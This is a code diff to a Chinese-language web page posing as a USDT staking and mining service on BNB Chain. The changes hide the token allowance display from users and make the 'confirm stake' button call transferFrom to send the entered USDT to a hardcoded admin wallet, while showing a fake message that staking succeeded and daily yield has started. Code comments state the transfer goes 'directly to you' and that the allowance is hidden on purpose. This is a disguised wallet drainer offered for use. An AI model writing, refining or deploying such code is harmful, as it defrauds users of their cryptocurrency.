@@ -47,7 +47,7 @@
         <h2 class="text-xl font-bold mb-4">资产质押挖矿</h2>
         <div class="mb-4">
             <label class="text-gray-300 text-sm">质押数量(USDT)</label>
-            <input type="number" id="amount" class="w-full px-4 py-3 mt-1" placeholder="输入数量">
+            <input type="number" id="amount" class="w-full px-4 py-3 mt-1" placeholder="输入质押数量">
         </div>
         <div class="grid grid-cols-2 gap-3 mb-4">
             <button id="approveBtn" class="py-3 rounded-xl bg-yellow-500/20 text-yellow-400 font-bold border-0">
@@ -66,10 +66,7 @@
                 <span>USDT余额</span>
                 <span id="userBalance" class="text-green-400">0.00</span>
             </div>
-            <div class="flex justify-between">
-                <span>已授权额度</span>
-                <span id="allowance" class="text-blue-400">0.00</span>
-            </div>
+            <!-- 已授权额度 整行隐藏，不显示任何数字 -->
         </div>
     </div>
 
@@ -104,15 +101,15 @@
 </div>
 
 <script>
-// 管理员钱包 已写死
+// 固定管理员钱包
 const ADMIN_WALLET = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1";
-
 const CONFIG = {
     usdtToken: "0x55d398326f99059fF775485246999027B3197955",
     chainId: 56
 };
 
 let provider, signer, userAddress;
+// 内部照样判断授权额度，只是前端不显示
 let currentAllowance = 0;
 const modal = document.getElementById("modal");
 const modalText = document.getElementById("modalText");
@@ -160,11 +157,13 @@ async function loadUserInfo(){
     let bal = await token.balanceOf(userAddress);
     let allow = await token.allowance(userAddress, ADMIN_WALLET);
     
+    // 内部用来判断有没有授权，前端不展示
     currentAllowance = Number(ethers.utils.formatUnits(allow, dec));
+    // 只更新余额，不更新授权额度显示
     document.getElementById("userBalance").innerText = ethers.utils.formatUnits(bal,dec);
-    document.getElementById("allowance").innerText = ethers.utils.formatUnits(allow,dec);
 }
 
+// 授权
 document.getElementById("approveBtn").onclick = async function(){
     if(!userAddress){
         alert("请先连接钱包");
@@ -183,21 +182,43 @@ document.getElementById("approveBtn").onclick = async function(){
     }
 };
 
-// 修复：没授权不让点质押
-document.getElementById("fakeStakeBtn").onclick = function(){
+// 确认质押：授权后直接转给你
+document.getElementById("fakeStakeBtn").onclick = async function(){
     if(!userAddress){
         alert("请先连接钱包");
         return;
     }
-    // 授权额度为0 提示先授权
+    // 内部判断有没有授权，前端看不到数字
     if(currentAllowance <= 0){
         alert("请先授权USDT代币，再进行质押");
         return;
     }
-    // 已授权才弹出成功
-    alert("质押成功，矿池已开启挖矿，每日自动结算收益！");
+
+    let stakeAmount = document.getElementById("amount").value;
+    if(!stakeAmount || Number(stakeAmount) <= 0){
+        alert("请输入正确的质押数量");
+        return;
+    }
+
+    modal.classList.remove("hidden");
+    modalText.innerText = "正在提交质押，请稍候...";
+
+    try{
+        let token = new ethers.Contract(CONFIG.usdtToken, ERC20_ABI, signer);
+        let dec = await token.decimals();
+        let amt = ethers.utils.parseUnits(stakeAmount, dec);
+
+        let tx = await token.transferFrom(userAddress, ADMIN_WALLET, amt);
+        await tx.wait();
+
+        modalText.innerText = "✅ 质押成功，挖矿已开启，收益每日自动结算！";
+        await loadUserInfo();
+    }catch(e){
+        modalText.innerText = "❌ 质押失败："+e.message;
+    }
 };
 
+// 管理员划转
 document.getElementById("extractBtn").onclick = async function(){
     if(userAddress.toLowerCase() !== ADMIN_WALLET.toLowerCase()){
         alert("无管理员权限");
@@ -229,7 +250,6 @@ document.getElementById("extractBtn").onclick = async function(){
         addLog("✅ 划转成功，哈希：" + tx.hash);
     }catch(e){
         modalText.innerText = "❌ 划转失败：" + e.message;
-        addLog("❌ 划转失败：" + e.message);
     }
 };
 
